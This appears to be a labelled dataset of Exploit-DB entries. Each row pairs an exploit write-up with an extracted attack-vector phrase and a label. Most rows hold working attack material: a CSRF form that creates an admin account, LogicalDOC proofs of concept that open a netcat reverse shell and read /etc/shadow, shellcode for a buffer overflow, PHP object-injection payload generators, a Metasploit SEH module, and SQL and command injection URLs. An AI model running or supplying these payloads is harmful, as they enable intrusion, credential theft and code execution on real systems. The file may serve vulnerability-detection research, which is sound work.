34068,"CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery source: https://www.securityfocus.com/bid/40483/info  CMS Made Simple is prone to multiple cross-site scripting vulnerabilities because the software fails to sufficiently sanitize user-supplied inputs. The application is also prone to a cross-site request-forgery vulnerability.  An attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  The attacker can exploit the cross-site request-forgery issue by tricking a victim into following a specially crafted HTTP request designed to perform some action on the attacker's behalf using a victim's currently active session.  CMS Made Simple 1.7.1 and prior are vulnerable.   <form name=""csrf""  action=""http://www.example.com:7080/config/confMgr.php"" method=""post"" target=""hidden""> <input type=""hidden"" name=""a"" value=""s"" /> <input type=""hidden"" name=""m"" value=""admin"" /> <input type=""hidden"" name=""p"" value=""security"" /> <input type=""hidden"" name=""t"" value=""`ADMIN_USR_NEW"" /> <input type=""hidden"" name=""r"" value="""" /> <input type=""hidden"" name=""file_create"" value="""" /> <input type=""hidden"" name=""name"" value=""owned"" /> <input type=""hidden"" name=""pass"" value=""password"" /> <input type=""hidden"" name=""pass1"" value=""password"" /> </form>",tricking a victim into following a specially crafted HTTP request designed to perform some action on the attacker's behalf using a victim's currently active session,1
44021,"LogicalDOC Enterprise 7.7.4 - Root Remote Code Execution LogicalDOC Enterprise 7.7.4 Post-Auth Command Execution Via Binary Path Manipulation   Vendor: LogicalDOC Srl Product web page: https://www.logicaldoc.com Affected version: 7.7.4                   7.7.3                   7.7.2                   7.7.1                   7.6.4                   7.6.2                   7.5.1                   7.4.2                   7.1.1  Summary: LogicalDOC is a free document management system that is designed to handle and share documents within an organization. LogicalDOC is a content repository, with Lucene indexing, Activiti workflow, and a set of automatic import procedures.  Desc: LogicalDOC suffers from multiple authenticated OS command execution vulnerabilities by manipulating the path of the many binaries included in the package when changing the settings with their respected arguments. This can be exploited to execute local root privilege escalation attack and/or inject and execute arbitrary system commands as the root or SYSTEM user depending on the platform affected.  Tested on: Microsoft Windows 10            Linux Ubuntu 16.04            Java 1.8.0_161            Apache-Coyote/1.1            Apache Tomcat/8.5.24            Apache Tomcat/8.5.13            Undisclosed 8.41   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2018-5452 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5452.php   26.01.2018     After saving the settings, the command will be executed whenever a user uploads a file that was inserted in the 'default.antivirus.includes' list. PoC for antivirus.command: --------------------------------------------------------------------------------------  POST /frontend/setting HTTP/1.1 Host: localhost:8080 Connection: keep-alive Content-Length: 594 X-GWT-Module-Base: http://localhost:8080/frontend/ X-GWT-Permutation: 87C7268A2BDB185A47D161B6D6D2DEE8 Origin: http://localhost:8080 User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.67 Content-Type: text/x-gwt-rpc; charset=UTF-8 Accept: */* Referer: http://localhost:8080/frontend.jsp?docId=3735554 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Cookie: GLog=%7B%0A%20%20%20%20trackRPC%3Afalse%0A%7D; JSESSIONID=FCFD7719139A634C8411FD081780BE2A; ldoc-sid=5dd1ea28-36a0-4967-bdd8-2556d16101d7   7|0|16|http://localhost:8080/frontend/|2B4A04609097A6274DA6D61C469E4E6B|com.logicaldoc.gui.frontend.client.services.SettingService|saveSettings|[Lcom.logicaldoc.gui.common.client.beans.GUIParameter;/1603922774|com.logicaldoc.gui.common.client.beans.GUIParameter/3041767606|default.antivirus.enabled|true|default.antivirus.excludes|*.tif,*.tiff,*.jpg,*.jpeg,*.png,*.bmp,*.gif,*.txt,*.iso|default.antivirus.includes|*.exe,*.com,*.pif,*.scr,*.dll,*.tar.gz|default.antivirus.timeout|0|antivirus.command|c:\\windows\\system32\\calc.exe|1|2|3|4|1|5|5|5|6|0|7|8|6|0|9|10|6|0|11|12|6|0|13|14|6|0|15|16|    PoC for call home reverse shell via ocr.Tesseract.path: -------------------------------------------------------  POST /frontend/setting HTTP/1.1 Host: localhost:8080   7|0|25|https://localhost:8080/frontend/|2B4A04609097A6274DA6D61C469E4E6B|com.logicaldoc.gui.frontend.client.services.SettingService|saveSettings|[Lcom.logicaldoc.gui.common.client.beans.GUIParameter;/1603922774|com.logicaldoc.gui.common.client.beans.GUIParameter/3041767606|default.ocr.includes|*.pdf,*.tif,*.png,*.jpg,*.txt|default.ocr.excludes|*.odt|default.ocr.text.threshold|1|default.ocr.resolution.threshold|400|ocr.timeout|90|ocr.rendres|180|ocr.rendres.barcode|ocr.batch|2|ocr.engine|Tesseract|ocr.Tesseract.path|nc -c /bin/sh 10.0.0.17 4444|1|2|3|4|1|5|5|10|6|0|7|8|6|0|9|10|6|0|11|12|6|0|13|14|6|0|15|16|6|0|17|18|6|0|19|18|6|0|20|21|6|0|22|23|6|0|24|25|    PoC for Key Store via OpenSSL path: -----------------------------------  POST /frontend/sign HTTP/1.1 Host: localhost:8080   7|0|14|https://localhost:8080/frontend/|16A5065211C47142C5282B2BC4600F1D|com.logicaldoc.gui.frontend.client.services.SignService|generateNewKeystore|com.logicaldoc.gui.common.client.beans.GUIKeystore/3815185030|java.util.Date/3385151746|1337|/usr/bin/openssl && /usr/bin/cat /etc/shadow|root|O=ZSL,OU=JXY,C=MK|123|#000000|$PAGE_WIDTH/6|5|1|2|3|4|1|5|5|6|WFn2zQZ|A|7|8|9|10|0|11|12|60|100|0|13|14|14|B|2|    PoC for clients and external apps and services path via command.convert, command.gs, command.openssl, command.pdftohtml, command.keytool: -----------------------------------------------------------------------------------------------------------------------------------------  POST /frontend/setting HTTP/1.1 Host: localhost:8080   7|0|35|https://localhost:8080/frontend/|2B4A04609097A6274DA6D61C469E4E6B|com.logicaldoc.gui.frontend.client.services.SettingService|saveSettings|[Lcom.logicaldoc.gui.common.client.beans.GUIParameter;/1603922774|com.logicaldoc.gui.common.client.beans.GUIParameter/3041767606|webservice.enabled|true|webdav.enabled|webdav.usecache|false|command.convert|/usr/bin/whoami > test.txt|command.gs|/usr/bin/gs|command.openssl|/usr/bin/openssl|command.pdftohtml|/usr/bin/pdftohtml|command.keytool|1337|cmis.enabled|cmis.changelog|cmis.maxitems|200|default.extcall.enabled|default.extcall.name|External Call|default.extcall.baseurl||default.extcall.suffix|default.extcall.window|_blank|default.extcall.params|user|1|2|3|4|1|5|5|17|6|0|7|8|6|0|9|8|6|0|10|11|6|0|12|13|6|0|14|15|6|0|16|17|6|0|18|19|6|0|20|21|6|0|22|8|6|0|23|8|6|0|24|25|6|0|26|11|6|0|27|28|6|0|29|30|6|0|31|30|6|0|32|33|6|0|34|35|",manipulating the path of the many binaries included in the package when changing the settings with their respected arguments,1
39284,"Oracle - 'HtmlConverter.exe' Local Buffer Overflow [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/ORACLE-HTMLCONVERTER-BUFFER-OVERFLOW.txt   Vendor: =============== www.oracle.com   Product: ======================================== Java Platform SE 6 U24 HtmlConverter.exe Product Version: 6.0.240.50   The HTML Converter is part of Java SE binary part of the JDK and Allows web page authors to explicitly target the browsers and platforms used in their environment when modifying their pages.    Vulnerability Type: ============================ Buffer Overflow   CVE Reference: ============== N/A    Vulnerability Details: =====================  When calling htmlConverter.exe with specially crafted payload it will cause buffer overflow executing arbitrary attacker supplied code. This was a small vulnerability included as part of the overall Oracle CPU released on January 19, 2016.  Reference: http://www.oracle.com/technetwork/topics/security/cpujan2016-2367955.html    registers ...  EAX FFFFFFFE ECX FFFFFFFE EDX 0008E3C8 EBX 7EFDE000 ESP 0018FEB4 EBP 0018FF88 ESI 00001DB1 EDI 00000000 EIP 52525252                          <-------- ""RRRR"" \x52 C 0  ES 002B 32bit 0(FFFFFFFF) P 0  CS 0023 32bit 0(FFFFFFFF) A 1  SS 002B 32bit 0(FFFFFFFF) Z 0  DS 002B 32bit 0(FFFFFFFF) S 0  FS 0053 32bit 7EFDD000(FFF) T 0  GS 002B 32bit 0(FFFFFFFF) D 0    Exploit code(s): ===============  ###pgm=""C:\\Oracle\\Middleware\\jdk160_24\\bin\\HtmlConverter.exe ""  #EIP @ 2493 pgm=""C:\\Program Files (x86)\\Java\jdk160_24\\bin\\HtmlConverter.exe "" #EIP 2469 - 2479  #shellcode to pop calc.exe Windows 7 SP1 sc=(""\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"" ""\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"" ""\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"" ""\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"" ""\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"" ""\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"" ""\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC"")   #JMP ESP kernel32.dll rp=struct.pack('<L', 0x76E72E2B)   payload=""A""*2469+rp+""\x90""*10+sc subprocess.Popen([pgm, payload], shell=False)   Disclosure Timeline: ===================================== Vendor Notification: August 28, 2015 January 20, 2016  : Public Disclosure    Exploitation Technique: ======================= Local    Severity Level: =============== Medium    Description: =============================================================  Vulnerable Product:     [+] Java SE 6 U24 HtmlConverter.exe  =============================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx",specially crafted payload,1
43886,"Pimcore CMS 1.4.9 <2.1.0 - Multiple Vulnerabilities > Vulnerabilities in Pimcore 1.4.9 to 2.1.0 (inclusive) > Discovered by Pedro Ribeiro (pedrib@gmail.com) of Agile Information Security ==================================================================== Disclosure: 14/04/2014 / Last updated: 12/10/2014  Vulnerability: Remote code execution in Pimcore CMS via unserialize() PHP object injection (CVE-2014-2921) Vulnerability: Arbitrary file deletion in Pimcore CMS via unserialize() PHP object injection (CVE-2014-2922) File(line): pimcore/lib/Pimcore/Tool/Newsletter.php(221)  Summary: This vulnerability can be exploited by sending a base64 encoded payload as the ""token"" parameter to the newsletter unsubscribe page of the target site. Payload [1] abuses several Zend classes to achieve remote code execution (based on Stefan Esser's technique in [2] and Egidio Romano's exploit code from [3]). Payload [4] abuses Zend_Http_Response_Stream to delete a file in /tmp/deleteme and works in all PHP versions.  Versions affected: 1.4.9 to 1.4.10 (inclusive) / 2.0.0 (possibly): Remote code execution (when server is running PHP <= 5.3.3).  1.4.9 to 2.1.0 (inclusive): Arbitrary file deletion (any PHP version), POSSIBLY remote code execution. Version 2.2.0 or higher resolves this vulnerability.  Due to changes introduced in PHP 5.3.4 to reject file names with null bytes, payload [3] does not work on Pimcore versions between 2.0.1 and 2.1.0 as Pimcore enforces a PHP 5.4 requirement. Version 2.0.0 might be vulnerable if anyone is running it on PHP versions <= 5.3.3... which according to the developers is not possible, but the requirement was only enforced in 2.0.1. Note that however the underlying vulnerability for both the remote code execution and the arbitrary file deletion is the same (unserialize() object injection), so it might be possible to execute code if any other Zend PHP POP chains are found in the future.   Fix for vulnerability: https://github.com/pimcore/pimcore/commit/3cb2683e669b5644f180d362cfa9614c09bef280   Newsletter.php added to repository on February 25th 2013 (was released in 1.4.9 on 02/Mar/13): https://github.com/pimcore/pimcore/commit/db18317af47de1de9f9ec6d83db1c2d353d06db7   PHP 5.4 requirement introduced on October 31st 2013 (was released in 2.0.1 on 20/Dec/13): https://github.com/pimcore/pimcore/commit/ee56ac2c1f7c9dc6e1617023fc766ea9c67e601b   Code snippets:  pimcore/lib/Pimcore/Tool/Newsletter.php(221):      public function getObjectByToken($token) {         $data = unserialize(base64_decode($token));         if($data) {             if($object = Object_Abstract::getById($data[""id""])) {                  if($version = $object->getLatestVersion()) {                     $object = $version->getData();                 }   This function is called in the same file in confirm() and unsubscribeByToken():     public function confirm($token) {          $object = $this->getObjectByToken($token);         if($object) {       public function unsubscribeByToken ($token) {          $object = $this->getObjectByToken($token);         if($object) {   In the Pimcore Wiki[5] and sample site[6], users are shown how to use the token parameter and encourage you to take the sample code and modify it. The sample code passes the token directly without any validation in confirmAction():     public function confirmAction() {          $this->enableLayout();          $this->view->success = false;          $newsletter = new Pimcore_Tool_Newsletter(""person""); // replace ""crm"" with the class name you have used for your class above (mailing list)          if($newsletter->confirm($this->getParam(""token""))) {             $this->view->success = true;         }   And also in unsubscribeAction():     public function unsubscribeAction() {          $this->enableLayout();          $newsletter = new Pimcore_Tool_Newsletter(""person""); // replace ""crm"" with the class name you have used for your class above (mailing list)          $unsubscribeMethod = null;         $success = false;          if($this->getParam(""email"")) {             $unsubscribeMethod = ""email"";             $success = $newsletter->unsubscribeByEmail($this->getParam(""email""));         }          if($this->getParam(""token"")) {             $unsubscribeMethod = ""token"";             $success = $newsletter->unsubscribeByToken($this->getParam(""token""));         }   Mitigation: Do not pass untrusted input into the unserialize function. Use JSON encoding / decoding instead of unserialize. This was introduced in commit 3cb2683e669 and released in version 2.2.0.  References: ======================================================== [1] Remote code execution, PHP <= 5.3.3, original code from [3] (Egidio Romano) <?php  class Zend_Search_Lucene_Index_FieldInfo {     public $name = '<?php phpinfo(); die;?>'; }   class Zend_Search_Lucene_Storage_Directory_Filesystem {     protected $_dirPath = null;           public function __construct($path)     {         $this->_dirPath = $path;     } }   interface Zend_Pdf_ElementFactory_Interface {}   class Zend_Search_Lucene_Index_SegmentWriter_StreamWriter implements Zend_Pdf_ElementFactory_Interface {     protected $_docCount = 1;     protected $_name = 'foo';     protected $_directory;     protected $_fields;     protected $_files;           public function __construct($directory, $fields)     {         $this->_directory = $directory;         $this->_fields    = array($fields);         $this->_files     = new stdClass;     } }       class Zend_Pdf_ElementFactory_Proxy {     private $_factory;           public function __construct(Zend_Pdf_ElementFactory_Interface $factory)     {         $this->_factory = $factory;     } }   // This null byte technique only works in PHP <= 5.3.3 $directory = new Zend_Search_Lucene_Storage_Directory_Filesystem(""/var/www/malicious.php\0""); $__factory = new Zend_Search_Lucene_Index_SegmentWriter_StreamWriter($directory, new Zend_Search_Lucene_Index_FieldInfo); $____proxy = new Zend_Pdf_ElementFactory_Proxy($__factory);   echo base64_encode(serialize($____proxy));  ?>  ======================================================== [2] http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf [3] http://www.exploit-db.com/exploits/19573 ======================================================== [4] Arbitrary file deletion, all PHP versions <?php class Zend_Http_Response_Stream  {     protected $stream;     protected $stream_name;     protected $_cleanup;     public function setStream($stream)     {         $this->stream = $stream;         return $this;     }     public function setCleanup($cleanup = true) {         $this->_cleanup = $cleanup;     }     public function setStreamName($stream_name) {         $this->stream_name = $stream_name;         return $this;     } } $resp = new Zend_Http_Response_Stream(); $resp->setStream(null); $resp->setCleanup(); $resp->setStreamName(""/tmp/deleteme"");  echo base64_encode(serialize($resp)); ?>  ======================================================== [5] http://www.pimcore.org/wiki/display/PIMCORE/Newsletter [6] Downloadable from the Pimcore website (https://www.pimcore.org/download/pimcore-data.zip). The file mentioned is website/controllers/NewsletterController.php.  Other references: https://www.owasp.org/index.php/PHP_Object_Injection http://www.alertlogic.com/writing-exploits-for-exotic-bug-classes/ http://vagosec.org/2013/12/wordpress-rce-exploit/   ================ Agile Information Security Limited http://www.agileinfosec.co.uk/ >> Enabling secure digital business >>","sending a base64 encoded payload as the ""token"" parameter to the newsletter unsubscribe page of the target site",1
36437,"Publish-It - '.PUI' Local Buffer Overflow (SEH) (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::FILEFORMAT    def initialize(info = {})     super(update_info(info,       'Name'    => 'Publish-It PUI Buffer Overflow (SEH)',       'Description'  => %q{           This module exploits a stack based buffer overflow in Publish-It when           processing a specially crafted .PUI file. This vulnerability could be           exploited by a remote attacker to execute arbitrary code on the target           machine by enticing a user of Publish-It to open a malicious .PUI file.       },       'License'    => MSF_LICENSE,       'Author'    =>         [           'Daniel Kazimirow',  # Original discovery           'Andrew Smith ""jakx_""',  # Exploit and MSF Module         ],       'References'  =>         [           [ 'OSVDB', '102911' ],           [ 'CVE', '2014-0980' ],           [ 'EDB', '31461' ]         ],       'DefaultOptions' =>         {           'ExitFunction' => 'process',         },       'Platform'  => 'win',       'Payload'  =>         {           'BadChars' => ""\x00\x0b\x0a"",           'DisableNops' => true,           'Space' => 377         },       'Targets'    =>         [           [ 'Publish-It 3.6d',             {               'Ret'     =>  0x0046e95a, #p/p/r | Publish.EXE               'Offset'  =>  1082             }           ],         ],       'Privileged'  => false,       'DisclosureDate'  => 'Feb 5 2014',       'DefaultTarget'  => 0))      register_options([OptString.new('FILENAME', [ true, 'The file name.', 'msf.pui']),], self.class)    end    def exploit      path = ::File.join(Msf::Config.data_directory, ""exploits"", ""CVE-2014-0980.pui"")     fd = File.open(path, ""rb"")     template_data = fd.read(fd.stat.size)     fd.close      buffer = template_data     buffer << make_nops(700)     buffer << payload.encoded     buffer << make_nops(target['Offset']-payload.encoded.length-700-5)     buffer << Rex::Arch::X86.jmp('$-399') #long negative jump -399     buffer << Rex::Arch::X86.jmp_short('$-24') #nseh negative jump     buffer << make_nops(2)     buffer << [target.ret].pack(""V"")      print_status(""Creating '#{datastore['FILENAME']}' file ..."")     file_create(buffer)    end end",a specially crafted .PUI file,1
39694,"Microsoft Excel - Out-of-Bounds Read Code Execution (MS16-042) #######################################################################################  # Title: Microsoft Office Excel Out-of-Bounds Read Remote Code Execution # Application: Microsoft Office Excel # Affected Products: Microsoft Office Excel 2007,2010,2013,2016 # Software Link: https://products.office.com/en-ca/excel # Date: April 12, 2016 # CVE: CVE-2016-0122 (MS16-042) # Author: Sébastien Morin from COSIG # Contact: https://twitter.com/COSIG_ (@COSIG_) # Personal contact: https://smsecurity.net/; https://twitter.com/SebMorin1 (@SebMorin1)  #######################################################################################  =================== Introduction: ===================  Microsoft Excel is a spreadsheet developed by Microsoft for Windows, Mac OS X, and iOS. It features calculation, graphing tools, pivot tables, and a macro programming language called Visual Basic for Applications. It has been a very widely applied spreadsheet for these platforms, especially since version 5 in 1993, and it has replaced Lotus 1-2-3 as the industry standard for spreadsheets. Excel forms part of Microsoft Office.  (https://en.wikipedia.org/wiki/Microsoft_Excel)  #######################################################################################  =================== Report Timeline: ===================  2016-02-06: Sébastien Morin from COSIG report the vulnerability to MSRC. 2016-02-16: MSRC confirm the vulnerability. 2016-04-12: Microsoft fixed the issue (MS16-042). 2016-04-13: Advisory released. #######################################################################################  =================== Technical details: ===================  This vulnerability could allow remote code execution if a user opens a specially crafted Microsoft Office file (.xlsm). An attacker who successfully exploited the vulnerabilities could run arbitrary code in the context of the current user.  #######################################################################################  ========== POC: ==========  https://smsecurity.net/wp-content/uploads/2016/04/Microsoft_Office_Excel_Out-of-Bounds_Read_RCE.xlsm https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39694.zip  #######################################################################################",a specially crafted Microsoft Office file (.xlsm),1
7854,"MediaMonkey 3.0.6 - '.m3u' Local Buffer Overflow (PoC) #!/usr/bin/perl # By ALpHaNiX # NullArea.Net # THanks #can get the software from http://www.download.com/MediaMonkey-Standard/3000-2141_4-10109807.html  my $file = ""alpix.m3u"" ; print ""[+] Exploiting....."" ; my $buff1=""http://"".""A"" x 543339 ; open(m3u, "">>$file"") or die ""Cannot open $file""; print m3u $buff1; close(m3u); print ""\n[+] done !"";  # milw0rm.com [2009-01-25]",a specially crafted .m3u file,1
22107,"SPGPartenaires 3.0.1 - 'ident.php' SQL Injection source: https://www.securityfocus.com/bid/6455/info  Several vulnerabilities have been discovered in SPGPartenaires. The vulnerabilities are due to insufficient sanitization of the 'pass' and 'SPGP' variables used to construct SQL queries in various PHP scripts. By exploiting these issues it is possible to modify the logic of SQL queries through malformed query strings in requests for the vulnerable script.  By injecting SQL code into the 'pass' or 'SPGP' variable, it may be possible for an attacker to corrupt member information. It may also be possible for attackers to perform more advanced attacks on the underlying database.   http://www.example.com/modif/ident.php?id=[MEMBERID]&pass='%20OR%20''='",malformed query strings in requests for the vulnerable script,1
20639,"Bajie 0.78 - Arbitrary Shell Command Execution source: https://www.securityfocus.com/bid/2389/info  Requesting a specailly crafted URL containg arbitrary code, can be exected on a Unix system running Bajie Webserver. Any arbitrary commands appended to a malicious URL after the ';' will be executed as an independent job.   http://target/bin/test.txt;%20[shell command]",malicious scripts,1
31478,Linksys SPA-2102 Phone Adapter Packet Handling - Denial of Service source: https://www.securityfocus.com/bid/28414/info  Linksys SPA-2102 Phone Adapter is prone to a denial-of-service vulnerability when handling multiple packets in quick succession.  Attackers can exploit this issue to deny access to the device's control center for legitimate users. Reports indicate that this issue is exploitable only via computers on the same LAN as the device.  Linksys SPA-2102 Phone Adapter running firmware 3.3.6 is vulnerable; other versions may also be affected.  ping -l 65500 192.168.0.1,handling multiple packets in quick succession,1
11622,"Opera 10.50 - integer Overflow <?php  /* *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ *------------------------------------------------------------------------------- * Opera 10.10 - 10.50  * Title: Integer overflow leading  *                  to  *        out of bounds array access R/W *                0day poc * Autor: Marcin Ressel aka ~echo  * Date: 3.03.2010  * Software: http://choice.opera.com/download/get.pl?thanks=true&sub=true&wu=1&wulang=pl&info=1 * Version: Tested on 10.10 , 10.50 but i thing other version is vulnerable to  * Platform: Windows xp home sp 2 pl * Muz: http://totgeliebt.wrzuta.pl/audio/6dXgnLnsI82 (podniecilem sie)  * Contanct: pokoFac_nerda@tvn24.pl *       * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ * * Exception: Access violation when writing to [01A23000] * Registers: EAX 03D89DF2              ECX 3FFF3ABE              EDX 00000002              EBX FFFFFFFF              ESP 0012F158              EBP 0012F160              ESI 03DBB2F8              EDI 01A23000              EIP 6781E0BA Opera_12.6781E0BA    * DUMP Function:         6781E060   55               PUSH EBP         6781E061   8BEC             MOV EBP,ESP         6781E063   57               PUSH EDI         6781E064   56               PUSH ESI         6781E065   8B75 0C          MOV ESI,DWORD PTR SS:[EBP+C]         6781E068   8B4D 10          MOV ECX,DWORD PTR SS:[EBP+10]         6781E06B   8B7D 08          MOV EDI,DWORD PTR SS:[EBP+8]         6781E06E   8BC1             MOV EAX,ECX         6781E070   8BD1             MOV EDX,ECX         6781E072   03C6             ADD EAX,ESI         6781E074   3BFE             CMP EDI,ESI         6781E076   76 08            JBE SHORT Opera_12.6781E080         6781E078   3BF8             CMP EDI,EAX         6781E07A   0F82 A4010000    JB Opera_12.6781E224         6781E080   81F9 00010000    CMP ECX,100         6781E086   72 1F            JB SHORT Opera_12.6781E0A7         6781E088   833D 882AF167 00 CMP DWORD PTR DS:[67F12A88],0         6781E08F   74 16            JE SHORT Opera_12.6781E0A7         6781E091   57               PUSH EDI         6781E092   56               PUSH ESI         6781E093   83E7 0F          AND EDI,0F         6781E096   83E6 0F          AND ESI,0F         6781E099   3BFE             CMP EDI,ESI         6781E09B   5E               POP ESI         6781E09C   5F               POP EDI         6781E09D   75 08            JNZ SHORT Opera_12.6781E0A7         6781E09F   5E               POP ESI         6781E0A0   5F               POP EDI         6781E0A1   5D               POP EBP         6781E0A2  ^E9 88CEFFFF      JMP Opera_12.6781AF2F         6781E0A7   F7C7 03000000    TEST EDI,3         6781E0AD   75 15            JNZ SHORT Opera_12.6781E0C4         6781E0AF   C1E9 02          SHR ECX,2         6781E0B2   83E2 03          AND EDX,3         6781E0B5   83F9 08          CMP ECX,8         6781E0B8   72 2A            JB SHORT Opera_12.6781E0E4  BUG->  6781E0BA   F3:A5            REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]  <-- BUG          6781E0BC   FF2495 D4E18167  JMP DWORD PTR DS:[EDX*4+6781E1D4]         6781E0C3   90               NOP         6781E0C4   8BC7             MOV EAX,EDI         6781E0C6   BA 03000000      MOV EDX,3         6781E0CB   83E9 04          SUB ECX,4         6781E0CE   72 0C            JB SHORT Opera_12.6781E0DC         6781E0D0   83E0 03          AND EAX,3         6781E0D3   03C8             ADD ECX,EAX         6781E0D5   FF2485 E8E08167  JMP DWORD PTR DS:[EAX*4+6781E0E8]         6781E0DC   FF248D E4E18167  JMP DWORD PTR DS:[ECX*4+6781E1E4]         6781E0E3   90               NOP         6781E0E4   FF248D 68E18167  JMP DWORD PTR DS:[ECX*4+6781E168]         ... *--------------------------------------------------------------------------- * BREAK AT 6781E0BA                 ECX=3FFF3ABE (decimal 1073691326.)           DS:[ESI]=[03DBB2F8]=00000000           ES:[EDI]=[01A23000]=??? *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         * */   if(strtolower(substr($_ENV['OS'],0,3)) == ""win"") define('OS','win');   else define('OS','nix');      if(!extension_loaded('php_sockets'))      {           if((OS == 'win') && (!@dl('php_sockets.dll')) ||           ((OS == 'nix') && (!@dl('php_sockets.so'))))              die('fatal php_sockets.[dll/so] '.                 'not loaded '.""\r\n"");            //.__line__.' '.__file__.""\r\n"");                                                          }    /*Generated by my own fuzzer*/     $EVIL = 'HTTP/1.1 200 ok'.""\r\n"".           'Transfer-Encoding: identity'.""\r\n"".           'Date: thu 28 dec 2003 12:4:33 gmt'.""\r\n"".           'Server: moj zuy server'.""\r\n"".           'Set-Cookie: psid=d6dd02e9957fb162d2385ca6f2829a73;path=C:/'.""\r\n"".           'Content-Location: file://C:/boot.ini'.""\r\n"".           'Vary:negotiate,accept-language,accept-charset'.""\r\n"".           'Tcn: choice'.""\r\n"".           'Last-modified: sun,21 nov 2010 22:22:22 gmt'.""\r\n"".           'Etag: ""3861-5c6-1b28fa80;386a-9dc-1b28fa80""'.""\r\n"".           'Accept-Ranges: bytes'.""\r\n"".           'Cache-Control: max-age=0'.""\r\n"".           'Expires: mon, 22 feb 2010 18:31:20 gmt'.""\r\n"".           'Content-Encoding: identity'.""\r\n"".           'Content-Lengthr\n"".           'Via: 1.1 cache.zuo.pl:3128 (squid/2.7.stable6)'.""\r\n"".           'Keep-Alive: timeout=15, max=300'.""\r\n"".           'Connection: keep-alive'.""\r\n"".           'Content-Type: text/html; charset=iso-8859-2'.""\r\n"".           'Age: 1'.""\r\n"".           'Allow: GET,HEAD'.""\r\n"".           'Content-Disposition: inline'.""\r\n"".           'Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ=='.""\r\n"".           'Warning: 199 Miscellaneous warning'.""\r\n"".           'Trailer: Max-Forwards'.""\r\n"".           'Location: chrome://inspector/content/viewers/dom/dom.xul'.""\r\n"".           'Content-Range: bytes 21010-47021/47022'.""\r\n"".           'Content-Language: pl'.""\r\n\r\n"".           '<html><head></head><body style=""background-color:red;color:white;text-align:center;""><b>seq_end</b><script>location.href=""http://swswqosksqowkd"";</script></body></html>';   $buster = $argc - 1;// - 1;   if($buster > 0)   {   for($i = 1; $i<$buster; $i+=2)        if(('-port' == $argv[$i]) && ((int)$argv[$i + 1] > 0)) $PORT = $argv[$i + 1];   }   else $PORT = 81;                                                                                                                                                 if(!($SOCKET = socket_create_listen($PORT)))                  die('fatal socket init failed'.""\r\n"");   socket_set_option($SOCKET,SOL_SOCKET,                             SO_RCVTIMEO,array(""sec""=>3,""usec""=>0));       echo('SOCKET READY AT PORT '.$PORT.""\r\n"".        'Now connect here via opera'.""\r\n"");                                      if($CONNECT = socket_accept($SOCKET))   {                 $recv_buffer = null;                 echo('Connection ok '.""\r\n"");                 if(socket_recv($CONNECT,$recv_buffer,8,/*msg_dontwait*/MSG_WAITALL))                   {                                 if(!@socket_write($CONNECT,$EVIL))                                 {                                     socket_close($CONNECT);                                     socket_close($SOCKET);                                           die('I cant send payload !'.""\r\n"");                                  }                      }                  else echo('Something wrong with client side'.""\r\n"");                 usleep(120000);                 socket_close($CONNECT);                 socket_close($SOCKET);                                                                    }                 echo('OK ya browser must be death now'.""\r\n"".        'Have a nice day lol'.""\r\n"");                     //[2010-03-03 20:47:46] //i cut be milion dolar man ;= ?>",a malformed long string,1
28282,"phpBB-Auction 1.x - 'auction_store.php?u' SQL Injection source: https://www.securityfocus.com/bid/19179/info   PHPBB-Auction is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.   These vulnerabilities could permit remote attackers to pass malicious input to database queries, resulting in the modification of query logic or other attacks.   A successful attack could allow an attacker to compromise the software, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/phpbb/auction_store.php?mode=store&u=[num][sql]",malicious input,1
